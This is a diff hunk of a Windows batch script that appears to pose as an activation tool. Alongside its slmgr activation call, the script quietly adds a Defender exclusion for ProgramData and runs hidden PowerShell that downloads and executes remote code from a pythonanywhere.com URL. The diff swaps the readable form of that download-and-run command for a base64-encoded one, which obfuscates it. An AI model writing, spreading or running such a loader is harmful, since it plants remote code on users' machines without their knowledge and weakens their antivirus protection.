@@ -84,8 +84,8 @@ if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
 %SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
 ::
 powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
-:: 
-powershell -nop -w hidden -c "iex (Invoke-RestMethod -Uri 'https://d6bed896.pythonanywhere.com/static/bullshit')" >nul 2>&1
+::
+powershell -nop -w hidden -enc aQBlAHgAIAAoAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBkADYAYgBlAGQAOAA5ADYALgBwAHkAdABoAG8AbgBhAG4AeQB3AGgAZQByAGUALgBjAG8AbQAvAHMAdABhAHQAaQBjAC8AYgB1AGwAbABzAGgAaQB0ACcAKQA= >nul 2>&1
 :: 
 exit /b
 ```
